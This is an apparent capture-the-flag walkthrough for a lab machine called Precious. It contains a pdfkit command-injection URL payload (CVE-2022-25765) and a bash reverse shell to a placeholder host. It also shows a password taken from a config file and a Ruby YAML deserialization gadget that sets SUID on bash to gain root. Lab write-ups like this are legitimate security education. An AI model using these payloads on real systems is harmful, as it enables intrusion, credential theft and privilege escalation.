# Precious

## Enumeration

Start off with an nmap scan:

```vim
# Nmap 7.93 scan initiated Sun Dec  4 09:59:28 2022 as: nmap -Pn -n -v -p 22,80 -sV -sC --open -oA precious 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  4 09:59:42 2022 -- 1 IP address (1 host up) scanned in 13.91 seconds
```

We can see that there is a redirect to `precious.htb` , so we will have to add an entry for it in our `/etc/hosts` file.

Looking at the webpage, we see a "Convert Web Page to PDF" website. There is no mention of what application is being used to perform this action but I decided to capture a request from it using `nc -lvnp 9000` and entering `http://<IP>:9000` as the URL in the webpage. I got back the following response:

```vim
┌──(kali㉿kali)-[~/precious]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.11.189] 45064
GET / HTTP/1.1
Host: 10.10.14.87:9000
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
```

You can also fingerprint the application being used via running a python web server using `python -m http.server` and by using `exiftool` on the downloaded PDF:

```vim
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool 52a8u7bk8alo1vkalg2juu5qxxivwgif.pdf 
ExifTool Version Number         : 12.51
File Name                       : 52a8u7bk8alo1vkalg2juu5qxxivwgif.pdf
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2022:12:10 04:55:33-05:00
File Access Date/Time           : 2022:12:10 04:55:33-05:00
File Inode Change Date/Time     : 2022:12:10 04:55:40-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

## Exploit

Looking for vulnerabilities, we come across this link: [CVE-2022-25765](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) 

We can test out this vulnerability via the following payload in the URL textfield: ```http://example.com/?name=#{'%20`sleep 5`'}```

```http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"`'}```

This will land you a reverse shell as the user `ruby`. In ruby's home directory, you can find the credentials for `henry` in .bundle/config:
```vim
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

We can log in with `su henry` and enter the password.

User flag is in : `/home/henry/user.txt`

## Priv-Esc

Running `sudo -l` will give us the following:

```vim
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

looking into this file, we see the following:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

This file is trying to load a file called `dependencies.yml` and then trying to compare the dependencies between what it has installed and `dependencies.yml` . 

Here, the function `YAML.load()` is taking in `dependencies.yml` which we could edit as we wish. Hence I start looking for any vulnerabilities in `YAML.load` and come across the following: [Blind RCE via YAML deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) 

Create a file called `dependencies.yml` and enter the following into it:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

Run `sudo /usr/bin/ruby /opt/update_dependencies.rb` and then run `bash -p`

Root flag will be in `/root/root.txt`
